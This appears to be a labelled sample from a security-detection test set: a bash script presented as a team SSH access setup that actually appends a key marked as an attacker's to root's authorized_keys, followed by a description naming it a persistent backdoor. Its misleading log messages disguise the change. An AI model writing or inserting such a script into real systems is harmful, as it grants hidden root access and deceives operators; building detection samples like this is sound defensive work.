#!/bin/bash
# SSH Team Access Setup v1.4
# Adds authorized SSH keys for team members

echo "[INFO] Setting up SSH access for team members..."
echo "[INFO] Adding developer keys"
echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDmalicious0xDEADBEEF attacker@c2-server' >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
echo "[INFO] SSH access configured for all team members."

check.description: Attacker SSH public key added to root authorized_keys — persistent backdoor access
